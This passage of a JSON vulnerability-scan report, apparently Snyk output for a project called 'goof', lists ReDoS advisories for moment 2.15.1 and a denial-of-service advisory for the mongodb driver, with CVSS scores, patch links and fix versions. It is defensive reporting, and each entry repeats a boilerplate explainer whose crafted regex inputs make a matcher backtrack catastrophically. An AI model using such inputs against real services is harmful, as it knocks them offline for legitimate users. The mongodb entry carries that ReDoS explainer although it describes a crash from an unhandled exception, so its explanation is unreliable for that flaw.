              "code_desc": "From : [ goof@1.0.1 , moment@2.15.1 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:moment:20161019",
          "desc": "## Overview\r\n[`moment`](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\r\n\r\nAffected versions of the package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks for any locale that has separate format and standalone options and `format` input can be controlled by the user.\r\n\r\nAn attacker can provide a specially crafted input to the `format` function, which nearly matches the pattern being matched. This will cause the regular expression matching to take a long time, all the while occupying the event loop and preventing it from processing other requests and making the server unavailable (a Denial of Service attack).\r\n\r\n## Disclosure Timeline\r\n- October 19th, 2016 - Reported the issue to package owner.\r\n- October 19th, 2016 - Issue acknowledged by package owner.\r\n- October 24th, 2016 - Issue fixed and version `2.15.2` released.\r\n\r\n## Details\r\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\r\n\r\n\r\n## References\r\n- [Proof of concept](https://gist.github.com/grnd/50192ce22681848a7de812d95241b7fc)\r\n- [Fix commit](https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9)",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MOMENT-10164\"\n  ],\n  \"creationTime\": \"2016-10-23T06:57:59.675000Z\",\n  \"credit\": [\n    \"Snyk Security Research Team\"\n  ],\n  \"cvssScore\": 5.9,\n  \"description\": \"## Overview\\r\\n[`moment`](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\\r\\n\\r\\nAffected versions of the package are vulnerable to Regular Expression Denial of Service (ReDoS) attacks for any locale that has separate format and standalone options and `format` input can be controlled by the user.\\r\\n\\r\\nAn attacker can provide a specially crafted input to the `format` function, which nearly matches the pattern being matched. This will cause the regular expression matching to take a long time, all the while occupying the event loop and preventing it from processing other requests and making the server unavailable (a Denial of Service attack).\\r\\n\\r\\n## Disclosure Timeline\\r\\n- October 19th, 2016 - Reported the issue to package owner.\\r\\n- October 19th, 2016 - Issue acknowledged by package owner.\\r\\n- October 24th, 2016 - Issue fixed and version `2.15.2` released.\\r\\n\\r\\n## Details\\r\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\r\\n\\r\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\r\\n\\r\\nLet’s take the following regular expression as an example:\\r\\n```js\\r\\nregex = /A(B|C+)+D/\\r\\n```\\r\\n\\r\\nThis regular expression accomplishes the following:\\r\\n- `A` The string must start with the letter 'A'\\r\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\r\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\r\\n\\r\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\r\\n\\r\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\r\\n\\r\\n```bash\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\r\\n0.04s user 0.01s system 95% cpu 0.052 total\\r\\n\\r\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\r\\n1.79s user 0.02s system 99% cpu 1.812 total\\r\\n```\\r\\n\\r\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\r\\n\\r\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\r\\n\\r\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\r\\n1. CCC\\r\\n2. CC+C\\r\\n3. C+CC\\r\\n4. C+C+C.\\r\\n\\r\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\r\\n\\r\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\r\\n\\r\\n| String | Number of C's | Number of steps |\\r\\n| -------|-------------:| -----:|\\r\\n| ACCCX | 3 | 38\\r\\n| ACCCCX | 4 | 71\\r\\n| ACCCCCX | 5 | 136\\r\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\r\\n\\r\\n\\r\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\r\\n\\r\\n\\r\\n## References\\r\\n- [Proof of concept](https://gist.github.com/grnd/50192ce22681848a7de812d95241b7fc)\\r\\n- [Fix commit](https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9)\",\n  \"disclosureTime\": \"2016-10-18T21:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.15.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"npm:moment:20161019\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MOMENT-10164\"\n    ],\n    \"CVE\": [],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-14T14:41:49.306035Z\",\n  \"moduleName\": \"moment\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"moment\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:moment:20161019:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.848228Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/moment/20161019/moment_20161019_0_1.patch\"\n      ],\n      \"version\": \"<2.15.2 >=2.14.0\"\n    },\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:moment:20161019:1\",\n      \"modificationTime\": \"2019-12-03T11:40:45.849308Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/moment/20161019/moment_20161019_0_0.patch\"\n      ],\n      \"version\": \"<2.14.0 >=2.12.0\"\n    }\n  ],\n  \"proprietary\": true,\n  \"publicationTime\": \"2016-10-24T06:57:59Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/moment/moment/commit/663f33e333212b3800b63592cd8e237ac8fabdb9\"\n    },\n    {\n      \"title\": \"Proof of concept\",\n      \"url\": \"https://gist.github.com/grnd/50192ce22681848a7de812d95241b7fc\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.15.2\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"moment@2.15.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"moment@2.15.2\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": true,\n  \"name\": \"moment\",\n  \"version\": \"2.15.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , moment@2.15.1 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2017-18214"
            ],
            "ghsaid": [
              "446m-mv8f-q348"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Regular Expression Denial of Service (ReDoS)",
          "id": "npm:moment:20170905",
          "desc": "## Overview\n[moment](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (`/[0-9]*['a-z\\u00A0-\\u05FF\\u0700-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFEF]+|[\\u0600-\\u06FF\\/]+(\\s*?[\\u0600-\\u06FF]+){1,2}/i`) in order to parse dates specified as strings. This can cause a very low impact of about 2 seconds matching time for data 50k characters long.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `moment` to version 2.19.3 or higher.\n## References\n- [GitHub Issue](https://github.com/moment/moment/issues/4163)\n- [GitHub PR](https://github.com/moment/moment/pull/4326)\n",
          "impact": 0.3,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L\",\n  \"alternativeIds\": [\n    \"SNYK-JS-MOMENT-10841\"\n  ],\n  \"creationTime\": \"2017-09-13T07:55:05.106000Z\",\n  \"credit\": [\n    \"Cristian-Alexandru Staicu\"\n  ],\n  \"cvssScore\": 3.7,\n  \"description\": \"## Overview\\n[moment](https://www.npmjs.com/package/moment) is a lightweight JavaScript date library for parsing, validating, manipulating, and formatting dates.\\n\\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It used a regular expression (`/[0-9]*['a-z\\\\u00A0-\\\\u05FF\\\\u0700-\\\\uD7FF\\\\uF900-\\\\uFDCF\\\\uFDF0-\\\\uFFEF]+|[\\\\u0600-\\\\u06FF\\\\/]+(\\\\s*?[\\\\u0600-\\\\u06FF]+){1,2}/i`) in order to parse dates specified as strings. This can cause a very low impact of about 2 seconds matching time for data 50k characters long.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `moment` to version 2.19.3 or higher.\\n## References\\n- [GitHub Issue](https://github.com/moment/moment/issues/4163)\\n- [GitHub PR](https://github.com/moment/moment/pull/4326)\\n\",\n  \"disclosureTime\": \"2017-09-05T21:00:00Z\",\n  \"exploit\": \"Not Defined\",\n  \"fixedIn\": [\n    \"2.19.3\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"monthsRegex\"\n      },\n      \"version\": [\n        \"<2.19.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"monthsShortRegex\"\n      },\n      \"version\": [\n        \"<2.19.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"weekdaysMinRegex\"\n      },\n      \"version\": [\n        \">=2.13.0 <2.19.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"weekdaysRegex\"\n      },\n      \"version\": [\n        \">=2.13.0 <2.19.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"weekdaysShortRegex\"\n      },\n      \"version\": [\n        \">=2.13.0 <2.19.3\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"monthsRegex\"\n      },\n      \"version\": [\n        \"<2.19.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"monthsShortRegex\"\n      },\n      \"version\": [\n        \"<2.19.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"weekdaysMinRegex\"\n      },\n      \"version\": [\n        \">=2.13.0 <2.19.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"weekdaysRegex\"\n      },\n      \"version\": [\n        \">=2.13.0 <2.19.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"moment.js\",\n        \"functionName\": \"weekdaysShortRegex\"\n      },\n      \"version\": [\n        \">=2.13.0 <2.19.3\"\n      ]\n    }\n  ],\n  \"id\": \"npm:moment:20170905\",\n  \"identifiers\": {\n    \"ALTERNATIVE\": [\n      \"SNYK-JS-MOMENT-10841\"\n    ],\n    \"CVE\": [\n      \"CVE-2017-18214\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-446m-mv8f-q348\"\n    ],\n    \"NSP\": [\n      \"532\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:11.796592Z\",\n  \"moduleName\": \"moment\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"moment\",\n  \"patches\": [\n    {\n      \"comments\": [],\n      \"id\": \"patch:npm:moment:20170905:0\",\n      \"modificationTime\": \"2019-12-03T11:40:45.878422Z\",\n      \"urls\": [\n        \"https://snyk-patches.s3.amazonaws.com/npm/moment/20170905/moment_0_0_69ed9d44957fa6ab12b73d2ae29d286a857b80eb.patch\"\n      ],\n      \"version\": \"<2.19.3 >=2.16.0\"\n    }\n  ],\n  \"proprietary\": false,\n  \"publicationTime\": \"2017-11-28T14:47:22Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Issue\",\n      \"url\": \"https://github.com/moment/moment/issues/4163\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/moment/moment/pull/4326\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.19.3\"\n    ]\n  },\n  \"severity\": \"low\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"low\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"moment@2.15.1\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"moment@2.19.3\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"moment\",\n  \"version\": \"2.15.1\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , moment@2.15.1 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [],
            "ghsaid": [
              "mh5c-679w-hh4r"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Denial of Service (DoS)",
          "id": "SNYK-JS-MONGODB-473855",
          "desc": "## Overview\n[mongodb](https://www.npmjs.com/package/mongodb) is an official MongoDB driver for Node.js.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package fails to properly catch an exception when a collection name is invalid and the DB does not exist, crashing the application.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `mongodb` to version 3.1.13 or higher.\n## References\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1203)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-10-18T17:21:29.730576Z\",\n  \"credit\": [\n    \"Behnaz Hassanshahi\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n[mongodb](https://www.npmjs.com/package/mongodb) is an official MongoDB driver for Node.js.\\n\\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package fails to properly catch an exception when a collection name is invalid and the DB does not exist, crashing the application.\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: 